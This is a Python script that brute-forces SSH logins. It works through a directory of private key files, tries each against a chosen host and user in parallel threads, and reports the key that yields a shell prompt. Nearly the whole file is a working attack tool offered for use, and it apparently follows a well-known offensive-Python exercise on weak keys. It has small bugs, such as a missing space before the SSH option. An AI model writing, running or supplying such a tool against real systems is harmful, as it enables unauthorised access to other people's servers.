import pexpect
import argparse
import os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(maxConnections)
Stop = False
Fails = 0
def connect(user, host, keyFile, rlease):
    global Stop
    global Fails
    try:
        perm_denied = "Permission denied"
        ssh_newkey = "Are you sure you want to continue"
        conn_closed = "Connection is closed by remote host"
        opt = "-o PasswordAuthentication=no"
        connStr = "ssh {u}@{h} -i {k}{o}".format(u = user, h = host, k = keyFile, o = opt)
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#', ])
        if ret == 2:
            print("[-] Adding Host to ~/.shh/known_hosts")
            child.sendline("yes")
            connect(user,host,keyFile,False)
        elif ret == 3:
            print("[-] Connection Closed by Remote Host")
            Fails+=1
        elif ret > 3:
            print("[+] Success "+ str(keyFile))
            Stop = True
    finally:
        if rlease:
            connection_lock.release()
def main():
    parser = argparse.ArgumentParser("usage%prog -H <target host> -u <user> -d <directory>")
    parser.add_argument("-H", dest="tgtHost",type=str, help="Specify target host")
    parser.add_argument("-u",dest="user",type=str,help="Specify target user")
    parser.add_argument("-d",dest="passDir",type=str,help="Specify directory with keys")
    args = parser.parse_args()
    host = args.tgtHost
    user = args.user
    passDir = args.passDir
    if host == None or user == None or passDir == None:
        print(parser.usage)
        exit(0)
    for fileName in os.listdir(passDir):
        if Stop:
            print("[*] Exiting! Key found!")
            exit(0)
        if Fails > 5:
            print("[!] Exiting! Too Many Connections Closed By Remote Host!")
            print("[!!] Adjust number of simultaneous threads!")
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(passDir, fileName)
        print("[-] Testing Key File " +str(fullpath))
        t = Thread(target=connect, args=(user,host,fullpath,True))
        t.start()
if __name__ == "__main__":
    main()